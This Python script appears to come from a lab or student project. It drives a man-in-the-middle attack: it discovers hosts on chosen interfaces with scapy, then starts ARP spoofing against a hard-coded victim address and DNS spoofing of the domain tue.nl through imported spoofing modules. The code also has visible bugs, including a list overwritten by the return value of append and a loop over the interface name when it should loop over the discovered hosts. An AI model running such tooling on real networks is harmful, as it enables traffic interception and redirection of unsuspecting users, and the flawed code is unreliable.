from src import arp_spoof as arp
from src import dns_spoof as dns
from src import discover
from scapy.arch import get_if_list

hosts = dict()
discover_threads = dict()

if __name__ == '__main__':
    available_interfaces = get_if_list()
    print(f"The following interfaces were found: {available_interfaces}")
    print("Please type the names of the interfaces you want to discover hosts on, "
          "type 'done' once all desired interfaces have been input.")
    chosen_interfaces = list()
    while True:
        user_input = input("Name of interface to discover on, or 'done' once finished:\n")
        if user_input in available_interfaces:
            if user_input not in chosen_interfaces:
                chosen_interfaces.append(user_input)
                print(f"Currently selected interfaces: {chosen_interfaces}")
            else:
                print("This interface has already been selected")
        elif user_input == "done":
            break
        else:
            print("The name you gave does not match any of the available interfaces")

    print("Do you want to actively discover on any of the selected interfaces? "
          "This will generate large amounts of traffic as every possible IP address "
          "in the subnet will be pinged.")
    active_discover_interfaces = list()
    while True:
        user_input = input("[y/n]\n")
        if user_input == "n":
            break
        elif user_input == "y":
            while True:
                user_input = input("Name of interface to actively discover on, or 'done' once finished:\n")
                if user_input in chosen_interfaces:
                    if user_input not in active_discover_interfaces:
                        active_discover_interfaces = active_discover_interfaces.append(user_input)
                        print(f"Currently selected interfaces: {active_discover_interfaces}")
                    else:
                        print("This interface has already been selected")
                elif user_input == "done":
                    break
                else:
                    print("The name you gave does not match any of the chosen interfaces")

    print(f"Now starting discovery...  press [ENTER] once the desired hosts have been discovered.")
    # Start passively listening on all chosen interfaces
    for interface in chosen_interfaces:
        hosts[interface] = dict()
        discover_threads[interface] = discover.Discover(hosts, interface)
        discover_threads[interface].start()
        if interface in active_discover_interfaces:
            discover_threads[interface].active()
    input()
    print("Hosts discovered:")
    for interface in hosts:
        print(f"{interface}")
        for mac in interface:
            for ip in mac:
                print(f"  {mac}  -  {ip}")

    arp_spoofing = arp.ARPSpoofing(
        interface="enp0s3",
        target_mac="08:00:27:b7:c4:af",
        target_ip="192.168.56.101",
        spoofed_ips=["192.168.56.102"],
        delay=3
    )
    input("Press [enter] to start ARP spoofing")
    arp_spoofing.start()
    input("Press [enter] to start DNS spoofing")
    dns_spoofing = dns.DNSSpoofing(
        interface="enp0s3",
        domain_names=["tue.nl"],
        victims=[],
        redirect_ip=""
    )
    dns_spoofing.start()
    input("Press [enter] to stop DNS spoofing")
    dns_spoofing.stop()
    input("Press [enter] to stop ARP spoofing")
    arp_spoofing.stop()